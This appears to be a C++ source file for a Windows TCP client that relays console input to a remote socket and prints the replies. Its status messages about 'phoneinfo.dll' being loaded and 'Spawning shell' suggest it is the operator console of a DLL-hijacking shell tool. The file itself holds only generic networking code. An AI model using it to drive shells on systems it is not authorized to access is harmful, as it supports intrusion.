#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include "TcpClient.h"

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

TcpClient::TcpClient()
{

}

TcpClient::~TcpClient()
{
	WSACleanup();
}

int TcpClient::connectTCP(const char* hostname, const char* port)
{
	WSADATA wsaData;
	SOCKET socketClient = INVALID_SOCKET;
	struct addrinfo* result = NULL, * ptr = NULL, hints;
	int iResult = 0;
	//int recvbuflen = BUFSIZE;
	DWORD dwThreadIdOut;
	DWORD dwThreadIdIn;
	HANDLE hThreadOut;
	HANDLE hThreadIn;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		wprintf_s(L"WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(hostname, port, &hints, &result);
	if (iResult != 0) {
		wprintf_s(L"getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

		// Create a SOCKET for connecting to server
		socketClient = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (socketClient == INVALID_SOCKET) {
			wprintf_s(L"socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return 1;
		}

		// Connect to server.
		iResult = connect(socketClient, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(socketClient);
			socketClient = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);

	if (socketClient == INVALID_SOCKET) {
		wprintf_s(L"[-] Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

	// Create a thread to receive data from the socket in an infinite loop
	hThreadOut = CreateThread(NULL, 0, ReceiveDataFromSocket, (LPVOID)socketClient, 0, &dwThreadIdOut);
	if (hThreadOut == NULL)
	{
		wprintf_s(L"[-] Create thread failed: ReceiveDataFromSocket\n");
		return -1;
	}

	// Create a thread to read user input in an infinite loop 
	hThreadIn = CreateThread(NULL, 0, SendDataFromConsole, (LPVOID)socketClient, 0, &dwThreadIdIn);
	if (hThreadIn == NULL)
	{
		wprintf_s(L"[-] Create thread failed: SendDataFromConsole\n");
		return -1;
	}
	wprintf_s(L"[+] phoneinfo.dll has been loaded.\n");
	wprintf_s(L"[+] Connected.\n");
//	wprintf_s(L"[+] TryMe to give you Spawning shell...\n");
	wprintf_s(L"[+] Spawning shell...\n");

	// Wait for the socket to be closed 
	WaitForSingleObject(hThreadOut, INFINITE);

	// shutdown the connection since no more data will be sent
	iResult = shutdown(socketClient, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		wprintf_s(L"shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(socketClient);
		WSACleanup();
		return 1;
	}

	// cleanup
	CloseHandle(hThreadIn);
	CloseHandle(hThreadOut);
	closesocket(socketClient);
	WSACleanup();

	return 0;
}

DWORD WINAPI TcpClient::ReceiveDataFromSocket(LPVOID lpvParam)
{
	int iResult;
	SOCKET socketClient = (SOCKET)lpvParam;
	char bufReceive[BUFSIZE];

	while (true)
	{
		ZeroMemory(bufReceive, BUFSIZE);
		iResult = recv(socketClient, bufReceive, BUFSIZE, 0);
		if (iResult > 0)
		{
			printf("%s", bufReceive);
		}
		else
			break;
	}
	return 0;
}

DWORD WINAPI TcpClient::SendDataFromConsole(LPVOID lpvParam)
{
	HANDLE hStdin;
	BOOL bSuccess = FALSE;
	DWORD dwRead = 0;
	SOCKET socketClient = (SOCKET)lpvParam;
	int iResult = 0;
	char bufCmd[BUFSIZE];
	char* pCr = { 0 };
	char* pLf = { 0 };

	// Get a handle on standard input 
	hStdin = GetStdHandle(STD_INPUT_HANDLE);
	if (hStdin == INVALID_HANDLE_VALUE)
		return 1;

	while (true)
	{
		bSuccess = ReadFile(hStdin, bufCmd, BUFSIZE, &dwRead, NULL);
		if (bSuccess == FALSE)
			break;


		pCr = strchr(bufCmd, '\r');
		if (pCr != NULL)
		{
			pLf = strchr(bufCmd, '\n');
			if (pLf != NULL)
			{
				pCr[0] = '\n';
				pLf[0] = 0;
			}
		}

		iResult = send(socketClient, bufCmd, (int)strlen(bufCmd), 0);
		if (iResult == SOCKET_ERROR) {
			printf("send failed with error: %d\n", WSAGetLastError());
			break;
		}
	}
	return 0;
}
